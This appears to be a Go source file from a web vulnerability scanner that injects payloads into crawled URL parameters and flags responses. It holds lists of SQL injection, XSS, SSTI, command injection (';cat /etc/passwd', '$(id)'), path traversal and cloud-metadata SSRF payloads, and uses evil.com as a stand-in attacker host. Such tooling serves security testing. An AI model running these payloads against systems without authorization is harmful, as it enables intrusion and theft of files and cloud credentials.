package scanner

import (
	"fmt"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/zanicool/apex-cli/pkg/crawler"
	"github.com/zanicool/apex-cli/pkg/engine"
	"github.com/zanicool/apex-cli/pkg/oob"
)

type Finding struct {
	Type     string `json:"type"`
	Severity string `json:"severity"`
	URL      string `json:"url"`
	Detail   string `json:"detail"`
	Param    string `json:"param,omitempty"`
	Payload  string `json:"payload,omitempty"`
	Evidence string `json:"evidence,omitempty"`
	Template string `json:"template"`
}

func Run(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, oobClient *oob.Client) []Finding {
	var findings []Finding
	var mu sync.Mutex

	scanners := []struct {
		name string
		fn   func(*engine.Config, *engine.HTTPClient, *crawler.Result, *oob.Client) []Finding
	}{
		// Core injection
		{"SQLi", scanSQLi},
		{"XSS", scanXSS},
		{"SSRF", scanSSRF},
		{"CMDi", scanCMDi},
		{"SSTI", scanSSTI},
		{"LFI", scanLFI},
		{"Open Redirect", scanOpenRedirect},
		{"IDOR", scanIDOR},
		{"Host Header", scanHostHeader},
		{"CORS", scanCORS},
		{"Prototype Pollution", scanPrototypePollution},
		// Advanced injection
		{"NoSQL Injection", scanNoSQL},
		{"XXE", scanXXE},
		{"LDAP Injection", scanLDAP},
		{"XPath Injection", scanXPath},
		{"EL Injection", scanELInjection},
		{"PHP Object Injection", scanPHPObjectInjection},
		// Logic bugs
		{"Race Condition", scanRaceCondition},
		{"Price Manipulation", scanPriceManipulation},
		{"Payment Bypass", scanPaymentBypass},
		{"Mass Assignment", scanMassAssignment},
		{"Forced Browsing", scanForcedBrowsing},
		{"IDOR UUID", scanIDORUUID},
		// Infrastructure
		{"Subdomain Takeover", scanSubdomainTakeover},
		{"S3 Buckets", scanS3Buckets},
		{"DNS Zone Transfer", wrapNoHTTP(scanDNSZoneTransfer)},
		{"VHost Fuzzing", scanVHostFuzzing},
		// Modern web
		{"GraphQL", scanGraphQL},
		{"HTTP Smuggling", wrapNoHTTP2(scanHTTPSmuggling)},
		{"Cache Poisoning", scanCachePoisoning},
		{"WebSocket", scanWebSocket},
		{"H2C Smuggling", scanH2CSmuggling},
		// OOB confirmed
		{"Blind SSRF OOB", scanBlindSSRF},
		{"Blind CMDi OOB", scanBlindCMDi},
		{"Blind SQLi OOB", scanBlindSQLiOOB},
		{"Log4Shell OOB", scanLog4Shell},
		// Passive
		{"JS Secrets", scanJSSecrets},
		{"Source Maps", scanSourceMaps},
		{"Dependency Confusion", scanDependencyConfusion},
		// Web common
		{"CSRF", scanCSRF},
		{"Clickjacking", scanClickjacking},
		{"CRLF Injection", scanCRLF},
		{"Security Headers", scanHeaders},
		{"Cookie Security", scanCookieSecurity},
		{"Info Disclosure", scanInfoDisclosure},
		// Exploits
		{"File Upload", scanFileUpload},
		{"RFI", scanRFI},
		{"Deserialization", scanDeserialization},
		{"Spring4Shell", scanSpring4Shell},
		{"Shellshock", scanShellshock},
		{"SSRF Variants", scanSSRFVariants},
		{"HTTP Verb Tampering", scanHTTPVerbTampering},
		{"403 Bypass", scan403Bypass},
		// Web advanced
		{"CORS Advanced", scanCORSAdvanced},
		{"Open Redirect Advanced", scanOpenRedirectAdvanced},
		{"HPP", scanHPP},
		{"JSONP", scanJSONP},
		{"CSP Bypass", scanCSPBypass},
		{"DOM XSS", scanDOMXSS},
		{"postMessage", scanPostMessage},
		{"SSI Injection", scanSSI},
		// Extra
		{"SAML", scanSAML},
		{"Web Cache Deception", scanWebCacheDeception},
		{"Timing Attacks", scanTimingAttacks},
		{"Account Takeover", scanAccountTakeover},
		{"Email Injection", scanEmailInjection},
		{"ReDoS", scanReDoS},
		{"Null Byte", scanNullByte},
		{"Range Amplification", scanRangeAmplification},
		{"Hop-by-Hop", scanHopByHop},
		{"Method Override", scanMethodOverride},
		{"XSLT Injection", scanXSLT},
		{"Log Injection", scanLogInjection},
		// Recon/API
		{"API Version Bypass", scanAPIVersionBypass},
		{"Rate Limit Bypass", scanRateLimitBypass},
		{"Cloud Metadata", scanCloudMetadata},
		{"Firebase Misconfig", scanFirebaseMisconfig},
		{"Wayback Secrets", scanWaybackSecrets},
		{"Tech-Specific", scanTechSpecific},
		{"IP Header Spoofing", scanIPHeaderSpoofing},
		// Remaining
		{"DNS Rebinding", scanDNSRebinding},
		{"Subdomain Permutation", scanSubdomainPermutation},
		{"Staging Exposure", scanStagingExposure},
		{"Open Ports", scanOpenPorts},
		{"SSRF → Cloud Creds", scanExploitChainSSRFCloud},
		{"Second Order Injection", scanSecondOrderInjection},
		{"Open Redirect OAuth Chain", scanOpenRedirectOAuthChain},
		{"Billion Laughs", scanBillionLaughs},
		{"TRACE/OPTIONS", scanTraceOptions},
		{"HTTP/2 Rapid Reset", scanHTTP2RapidReset},
		{"XS-Leaks", scanXSLeaks},
		{"Cookie Tossing", scanCookieTossing},
		{"Param Discovery", scanParamDiscovery},
		// Advanced auth
		{"Token Race Condition", scanTokenRaceCondition},
		{"Workflow Bypass", scanWorkflowBypass},
		{"Account Pre-Hijacking", scanAccountPrehijacking},
		{"Server Timing Oracle", scanServerTimingOracle},
		{"Compression Oracle", scanCompressionOracle},
		{"Dangling Markup", scanDanglingMarkup},
		{"ETag Tracking", scanEtagTracking},
		{"Mutation Fuzzer", scanMutationFuzzer},
		// Browser-confirmed (requires Chrome/Chromium)
		{"XSS Browser-Confirmed", scanBrowserXSS},
		{"DOM XSS Browser", scanBrowserDOMXSS},
		{"postMessage Browser", scanBrowserPostMessage},
		// Power upgrades (2x finding rate)
		{"JS Endpoint Discovery", scanJSEndpoints},
		{"Authenticated Scan", scanAuthenticated},
		{"Param Brute-Force", scanParamBruteforce},
		{"Differential Analysis", scanDifferential},
		// Smart detection (fewer false positives, more true positives)
		{"SQLi Boolean Blind", scanSQLiBlindBoolean},
		{"XSS Context-Aware", scanXSSContextAware},
	}

	var wg sync.WaitGroup
	sem := make(chan struct{}, 8) // 8 scanner types in parallel
	scanTimeout := 60 * time.Second
	if cfg.Deep {
		scanTimeout = 180 * time.Second
	}

	for _, s := range scanners {
		if cfg.Skip != "" && strings.Contains(cfg.Skip, strings.ToLower(s.name)) {
			continue
		}
		wg.Add(1)
		go func(name string, fn func(*engine.Config, *engine.HTTPClient, *crawler.Result, *oob.Client) []Finding) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			fmt.Printf("    [→] %s\n", name)

			// Per-scanner timeout
			done := make(chan []Finding, 1)
			go func() {
				done <- fn(cfg, http, crawl, oobClient)
			}()

			select {
			case results := <-done:
				mu.Lock()
				findings = append(findings, results...)
				mu.Unlock()
				if len(results) > 0 {
					fmt.Printf("    [!] %s: %d findings\n", name, len(results))
				}
			case <-time.After(scanTimeout):
				fmt.Printf("    [⏱] %s: timeout\n", name)
			}
		}(s.name, s.fn)
	}
	wg.Wait()

	// Smart deduplication — remove duplicate findings for same endpoint
	findings = DeduplicateFindings(findings)
	return findings
}

// Wrappers for scanners with different signatures
func wrapNoHTTP(fn func(*engine.Config, *engine.HTTPClient, *crawler.Result, *oob.Client) []Finding) func(*engine.Config, *engine.HTTPClient, *crawler.Result, *oob.Client) []Finding {
	return fn
}

func wrapNoHTTP2(fn func(*engine.Config, *engine.HTTPClient, *crawler.Result, *oob.Client) []Finding) func(*engine.Config, *engine.HTTPClient, *crawler.Result, *oob.Client) []Finding {
	return fn
}

// --- SQLi Scanner ---

var sqliPayloads = []struct {
	payload string
	detect  string
}{
	{"'", "sql syntax|mysql|mariadb|postgresql|sqlite|oracle|unterminated"},
	{"' OR '1'='1", "sql syntax|mysql|true"},
	{"1' AND '1'='2", ""},
	{"' UNION SELECT NULL--", "union|null"},
	{"1; WAITFOR DELAY '0:0:3'--", ""},
	{"' AND SLEEP(3)--", ""},
	{"1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--", ""},
	{"') OR ('1'='1", "sql syntax"},
	{"' AND 1=CONVERT(int,(SELECT @@version))--", "convert|version"},
	{"' AND extractvalue(1,concat(0x7e,version()))--", "xpath|version"},
}

func scanSQLi(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	var mu sync.Mutex

	type target struct {
		url   string
		param string
	}
	var targets []target
	for u, params := range crawl.Params {
		for _, p := range params {
			targets = append(targets, target{u, p})
		}
	}

	sem := make(chan struct{}, cfg.Threads)
	var wg sync.WaitGroup

	for _, t := range targets {
		for _, payload := range sqliPayloads {
			wg.Add(1)
			go func(tgt target, pl struct{ payload, detect string }) {
				defer wg.Done()
				sem <- struct{}{}
				defer func() { <-sem }()

				testURL := injectParam(tgt.url, tgt.param, pl.payload)
				resp := http.Get(testURL)
				if resp.Err != nil || resp.StatusCode == 0 {
					return
				}

				// Error-based detection
				if pl.detect != "" {
					bodyLower := strings.ToLower(resp.Body)
					for _, sig := range strings.Split(pl.detect, "|") {
						if strings.Contains(bodyLower, sig) {
							mu.Lock()
							findings = append(findings, Finding{
								Type:     "SQL Injection (Error-Based)",
								Severity: "critical",
								URL:      testURL,
								Param:    tgt.param,
								Payload:  pl.payload,
								Evidence: sig,
								Template: "apex-sqli-error",
							})
							mu.Unlock()
							return
						}
					}
				}

				// Time-based detection (SLEEP payloads)
				if strings.Contains(pl.payload, "SLEEP") || strings.Contains(pl.payload, "WAITFOR") {
					if resp.Duration.Seconds() >= 2.5 {
						mu.Lock()
						findings = append(findings, Finding{
							Type:     "SQL Injection (Time-Based Blind)",
							Severity: "critical",
							URL:      testURL,
							Param:    tgt.param,
							Payload:  pl.payload,
							Evidence: fmt.Sprintf("Response delayed %.1fs", resp.Duration.Seconds()),
							Template: "apex-sqli-time",
						})
						mu.Unlock()
					}
				}
			}(t, payload)
		}
	}
	wg.Wait()
	return dedup(findings)
}

// --- XSS Scanner ---

var xssPayloads = []struct {
	payload string
	detect  string
}{
	{`<script>alert(1)</script>`, `<script>alert(1)</script>`},
	{`"><img src=x onerror=alert(1)>`, `onerror=alert(1)`},
	{`'><svg/onload=alert(1)>`, `onload=alert(1)`},
	{`javascript:alert(1)`, `javascript:alert(1)`},
	{`" onfocus=alert(1) autofocus="`, `onfocus=alert(1)`},
	{`{{constructor.constructor('alert(1)')()}}`, `constructor.constructor`},
	{`'-alert(1)-'`, `'-alert(1)-'`},
	{`</script><script>alert(1)</script>`, `<script>alert(1)</script>`},
}

func scanXSS(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	var mu sync.Mutex
	sem := make(chan struct{}, cfg.Threads)
	var wg sync.WaitGroup

	for u, params := range crawl.Params {
		for _, p := range params {
			for _, payload := range xssPayloads {
				wg.Add(1)
				go func(baseURL, param string, pl struct{ payload, detect string }) {
					defer wg.Done()
					sem <- struct{}{}
					defer func() { <-sem }()

					testURL := injectParam(baseURL, param, pl.payload)
					resp := http.Get(testURL)
					if resp.Err != nil || resp.StatusCode == 0 {
						return
					}
					if strings.Contains(resp.Body, pl.detect) {
						mu.Lock()
						findings = append(findings, Finding{
							Type:     "Cross-Site Scripting (Reflected)",
							Severity: "high",
							URL:      testURL,
							Param:    param,
							Payload:  pl.payload,
							Evidence: pl.detect,
							Template: "apex-xss-reflected",
						})
						mu.Unlock()
					}
				}(u, p, payload)
			}
		}
	}
	wg.Wait()
	return dedup(findings)
}

// --- SSRF Scanner ---

func scanSSRF(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, oobClient *oob.Client) []Finding {
	var findings []Finding
	var mu sync.Mutex
	sem := make(chan struct{}, cfg.Threads)
	var wg sync.WaitGroup

	ssrfParams := []string{"url", "uri", "link", "src", "source", "fetch", "request",
		"proxy", "redirect", "image", "avatar", "webhook", "callback", "endpoint", "dest"}

	ssrfPayloads := []string{
		"http://169.254.169.254/latest/meta-data/",
		"http://127.0.0.1:80/",
		"http://[::1]/",
		"http://0x7f000001/",
		"http://2130706433/",
		"http://169.254.169.254/computeMetadata/v1/",
	}

	for u, params := range crawl.Params {
		for _, p := range params {
			pLower := strings.ToLower(p)
			isSSRFParam := false
			for _, sp := range ssrfParams {
				if strings.Contains(pLower, sp) {
					isSSRFParam = true
					break
				}
			}
			if !isSSRFParam {
				continue
			}
			for _, payload := range ssrfPayloads {
				wg.Add(1)
				go func(baseURL, param, pl string) {
					defer wg.Done()
					sem <- struct{}{}
					defer func() { <-sem }()

					testURL := injectParam(baseURL, param, pl)
					resp := http.Get(testURL)
					if resp.Err != nil {
						return
					}
					bodyLower := strings.ToLower(resp.Body)
					if strings.Contains(bodyLower, "ami-id") ||
						strings.Contains(bodyLower, "instance-id") ||
						strings.Contains(bodyLower, "iam") ||
						strings.Contains(bodyLower, "metadata") ||
						strings.Contains(bodyLower, "root:x:0") {
						mu.Lock()
						findings = append(findings, Finding{
							Type:     "Server-Side Request Forgery (SSRF)",
							Severity: "critical",
							URL:      testURL,
							Param:    param,
							Payload:  pl,
							Evidence: resp.Body[:min(200, len(resp.Body))],
							Template: "apex-ssrf",
						})
						mu.Unlock()
					}
				}(u, p, payload)
			}
		}
	}
	wg.Wait()
	return findings
}

// --- CMDi Scanner ---

var cmdiPayloads = []struct {
	payload string
	detect  string
}{
	{";id", "uid="},
	{"|id", "uid="},
	{"`id`", "uid="},
	{"$(id)", "uid="},
	{";cat /etc/passwd", "root:x:0"},
	{"|cat /etc/passwd", "root:x:0"},
	{"& ping -c 3 127.0.0.1 &", "bytes from"},
	{";sleep 3", ""},
	{"|timeout 3", ""},
}

func scanCMDi(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	var mu sync.Mutex
	sem := make(chan struct{}, cfg.Threads)
	var wg sync.WaitGroup

	for u, params := range crawl.Params {
		for _, p := range params {
			for _, payload := range cmdiPayloads {
				wg.Add(1)
				go func(baseURL, param string, pl struct{ payload, detect string }) {
					defer wg.Done()
					sem <- struct{}{}
					defer func() { <-sem }()

					testURL := injectParam(baseURL, param, pl.payload)
					resp := http.Get(testURL)
					if resp.Err != nil {
						return
					}
					if pl.detect != "" && strings.Contains(resp.Body, pl.detect) {
						mu.Lock()
						findings = append(findings, Finding{
							Type:     "OS Command Injection",
							Severity: "critical",
							URL:      testURL,
							Param:    param,
							Payload:  pl.payload,
							Evidence: pl.detect,
							Template: "apex-cmdi",
						})
						mu.Unlock()
					} else if strings.Contains(pl.payload, "sleep") && resp.Duration.Seconds() >= 2.5 {
						mu.Lock()
						findings = append(findings, Finding{
							Type:     "OS Command Injection (Time-Based)",
							Severity: "critical",
							URL:      testURL,
							Param:    param,
							Payload:  pl.payload,
							Evidence: fmt.Sprintf("Delayed %.1fs", resp.Duration.Seconds()),
							Template: "apex-cmdi-time",
						})
						mu.Unlock()
					}
				}(u, p, payload)
			}
		}
	}
	wg.Wait()
	return dedup(findings)
}

// --- SSTI Scanner ---

var sstiPayloads = []struct {
	payload string
	detect  string
}{
	{"{{7*7}}", "49"},
	{"${7*7}", "49"},
	{"<%= 7*7 %>", "49"},
	{"#{7*7}", "49"},
	{"{{''.__class__.__mro__[1].__subclasses__()}}", "subprocess"},
	{"${T(java.lang.Runtime).getRuntime()}", "java.lang.Runtime"},
	{"{php}echo 7*7;{/php}", "49"},
	{"{{config}}", "SECRET_KEY"},
}

func scanSSTI(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	var mu sync.Mutex
	sem := make(chan struct{}, cfg.Threads)
	var wg sync.WaitGroup

	for u, params := range crawl.Params {
		for _, p := range params {
			for _, payload := range sstiPayloads {
				wg.Add(1)
				go func(baseURL, param string, pl struct{ payload, detect string }) {
					defer wg.Done()
					sem <- struct{}{}
					defer func() { <-sem }()

					// Get baseline first to avoid false positives
					baseResp := http.Get(baseURL)
					if baseResp.Err == nil && strings.Contains(baseResp.Body, pl.detect) {
						return // Detection string already in baseline = false positive
					}

					testURL := injectParam(baseURL, param, pl.payload)
					resp := http.Get(testURL)
					if resp.Err != nil {
						return
					}
					if strings.Contains(resp.Body, pl.detect) {
						mu.Lock()
						findings = append(findings, Finding{
							Type:     "Server-Side Template Injection (SSTI)",
							Severity: "critical",
							URL:      testURL,
							Param:    param,
							Payload:  pl.payload,
							Evidence: pl.detect,
							Template: "apex-ssti",
						})
						mu.Unlock()
					}
				}(u, p, payload)
			}
		}
	}
	wg.Wait()
	return dedup(findings)
}

// --- LFI Scanner ---

func scanLFI(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	var mu sync.Mutex
	sem := make(chan struct{}, cfg.Threads)
	var wg sync.WaitGroup

	lfiPayloads := []struct{ payload, detect string }{
		{"../../../etc/passwd", "root:x:0"},
		{"....//....//....//etc/passwd", "root:x:0"},
		{"/etc/passwd%00", "root:x:0"},
		{"..%2f..%2f..%2fetc%2fpasswd", "root:x:0"},
		{"..\\..\\..\\windows\\win.ini", "[extensions]"},
		{"php://filter/convert.base64-encode/resource=/etc/passwd", "cm9vd"},
	}

	fileParams := []string{"file", "path", "page", "include", "template", "doc", "folder", "pg", "view", "content", "load"}

	for u, params := range crawl.Params {
		for _, p := range params {
			pLower := strings.ToLower(p)
			isFileParam := false
			for _, fp := range fileParams {
				if strings.Contains(pLower, fp) {
					isFileParam = true
					break
				}
			}
			if !isFileParam {
				continue
			}
			for _, payload := range lfiPayloads {
				wg.Add(1)
				go func(baseURL, param string, pl struct{ payload, detect string }) {
					defer wg.Done()
					sem <- struct{}{}
					defer func() { <-sem }()
					testURL := injectParam(baseURL, param, pl.payload)
					resp := http.Get(testURL)
					if resp.Err == nil && strings.Contains(resp.Body, pl.detect) {
						mu.Lock()
						findings = append(findings, Finding{
							Type: "Local File Inclusion (LFI)", Severity: "critical",
							URL: testURL, Param: param, Payload: pl.payload,
							Evidence: pl.detect, Template: "apex-lfi",
						})
						mu.Unlock()
					}
				}(u, p, payload)
			}
		}
	}
	wg.Wait()
	return dedup(findings)
}

// --- Open Redirect ---

func scanOpenRedirect(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	redirectParams := []string{"url", "redirect", "next", "return", "rurl", "dest", "destination", "continue", "goto"}
	payload := "https://evil.com"

	for u, params := range crawl.Params {
		for _, p := range params {
			pLower := strings.ToLower(p)
			for _, rp := range redirectParams {
				if strings.Contains(pLower, rp) {
					testURL := injectParam(u, p, payload)
					resp := http.Get(testURL)
					if resp.Err == nil && resp.StatusCode >= 300 && resp.StatusCode < 400 {
						loc := resp.Headers.Get("Location")
						if strings.Contains(loc, "evil.com") {
							findings = append(findings, Finding{
								Type: "Open Redirect", Severity: "medium",
								URL: testURL, Param: p, Payload: payload,
								Evidence: loc, Template: "apex-open-redirect",
							})
						}
					}
					break
				}
			}
		}
	}
	return findings
}

// --- IDOR ---

func scanIDOR(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	for u := range crawl.Params {
		// Swap numeric IDs in path
		parts := strings.Split(u, "/")
		for i, part := range parts {
			if len(part) > 0 && len(part) <= 10 && isNumeric(part) {
				original := part
				alt := "1"
				if original == "1" {
					alt = "2"
				}
				parts[i] = alt
				testURL := strings.Join(parts, "/")
				origResp := http.Get(u)
				altResp := http.Get(testURL)
				parts[i] = original
				if origResp.Err == nil && altResp.Err == nil &&
					origResp.StatusCode == 200 && altResp.StatusCode == 200 &&
					altResp.Body != origResp.Body && len(altResp.Body) > 50 {
					findings = append(findings, Finding{
						Type: "IDOR — Unauthorized Object Access", Severity: "high",
						URL: testURL, Detail: fmt.Sprintf("ID %s→%s returned different data", original, alt),
						Template: "apex-idor",
					})
				}
				break
			}
		}
	}
	return findings
}

// --- Host Header ---

func scanHostHeader(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	for _, target := range crawl.Pages[:min(10, len(crawl.Pages))] {
		items := []engine.RequestItem{
			{URL: target.URL, Method: "GET", Headers: map[string]string{"Host": "evil.com"}},
			{URL: target.URL, Method: "GET", Headers: map[string]string{"X-Forwarded-Host": "evil.com"}},
		}
		for resp := range http.BatchRequest(items, 2) {
			if resp.Err == nil && strings.Contains(resp.Body, "evil.com") {
				findings = append(findings, Finding{
					Type: "Host Header Injection", Severity: "high",
					URL: resp.URL, Detail: "Host/X-Forwarded-Host reflected in response",
					Template: "apex-host-header",
				})
			}
		}
	}
	return findings
}

// --- CORS ---

func scanCORS(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	for _, page := range crawl.Pages[:min(20, len(crawl.Pages))] {
		items := []engine.RequestItem{
			{URL: page.URL, Method: "GET", Headers: map[string]string{"Origin": "https://evil.com"}},
			{URL: page.URL, Method: "GET", Headers: map[string]string{"Origin": "null"}},
		}
		for resp := range http.BatchRequest(items, 2) {
			acao := resp.Headers.Get("Access-Control-Allow-Origin")
			if acao == "https://evil.com" || acao == "null" {
				acac := resp.Headers.Get("Access-Control-Allow-Credentials")
				sev := "medium"
				if acac == "true" {
					sev = "high"
				}
				findings = append(findings, Finding{
					Type: "CORS Misconfiguration", Severity: sev,
					URL: resp.URL, Detail: fmt.Sprintf("ACAO: %s, Credentials: %s", acao, acac),
					Template: "apex-cors",
				})
			}
		}
	}
	return findings
}

// --- Prototype Pollution ---

func scanPrototypePollution(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	for u := range crawl.Params {
		sep := "&"
		if !strings.Contains(u, "?") {
			sep = "?"
		}
		testURL := u + sep + "__proto__[polluted]=apex"
		resp := http.Get(testURL)
		if resp.Err == nil && strings.Contains(resp.Body, "apex") {
			findings = append(findings, Finding{
				Type: "Prototype Pollution", Severity: "high",
				URL: testURL, Detail: "__proto__ payload reflected",
				Template: "apex-prototype-pollution",
			})
		}
	}
	return findings
}

// --- Helpers ---

func injectParam(baseURL, param, payload string) string {
	u, err := url.Parse(baseURL)
	if err != nil {
		return baseURL
	}
	q := u.Query()
	q.Set(param, payload)
	u.RawQuery = q.Encode()
	return u.String()
}

func isNumeric(s string) bool {
	for _, c := range s {
		if c < '0' || c > '9' {
			return false
		}
	}
	return true
}

func dedup(findings []Finding) []Finding {
	seen := make(map[string]bool)
	var result []Finding
	for _, f := range findings {
		key := f.Type + "|" + f.URL
		if !seen[key] {
			seen[key] = true
			result = append(result, f)
		}
	}
	return result
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
